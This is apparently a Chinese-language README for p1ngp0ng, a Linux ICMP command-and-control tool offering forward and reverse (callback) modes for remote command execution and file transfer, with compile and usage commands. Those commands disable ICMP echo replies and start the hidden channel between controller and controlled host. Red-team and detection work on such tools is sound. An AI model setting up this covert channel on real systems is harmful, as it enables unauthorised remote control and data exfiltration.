# p1ngp0ng

Linux下的轻量级ICMP C2工具。

# 依赖

Linux环境与GCC套件。

# 功能：

p1ngp0ng提供两种工作场景，监听型（p1ng），内网反弹型（p0ng）。

**p1ng：**

p1ng，实现C2服务器正向连接被控端。目前实现了对客户端的命令控制与文件上传下载。明文传输，未加密。

**p0ng：**

p0ng，实现被控端反向连接C2服务器。目前实现了对客户端的命令控制与文件上传下载。明文传输，未加密。

# 编译

```shell
gcc p1ng.c -o p1ng
gcc p0ng.c -lpthread -o p0ng
```

# 使用

**p1ng：**

p1ng下主控端主动发起连接。

```shell
# step1 被动接收ICMP报文的设备上关闭对ICMP报文的自动响应。默认情况下该值为0。
client: echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all

# step2 启动客户端并等待连接。q是静音开关。
client: ./p1ng -C -q

# step3 启动p1ng C2服务器并主动连接客户端。
server: ./p1ng -S -c ${client_ip} -q
```

![main-panel](https://github.com/aplyc1a/p1ngp0ng/blob/master/logo.png)
![p1ng-simple-usage](https://github.com/aplyc1a/p1ngp0ng/blob/master/p1ng_usage.png)



**p0ng：**

p0ng下被控端主动发起连接。

```shell
# step1: 被动接收ICMP报文的设备上关闭对ICMP报文的自动响应。默认情况下该值为0。
server: echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all

# step2： 启动p0ng C2服务器。q是静音开关。
server: ./p0ng -S -q

# step3： 启动p0ng 客户端进行反连。
client: ./p0ng -C -s ${server_ip} -q
```

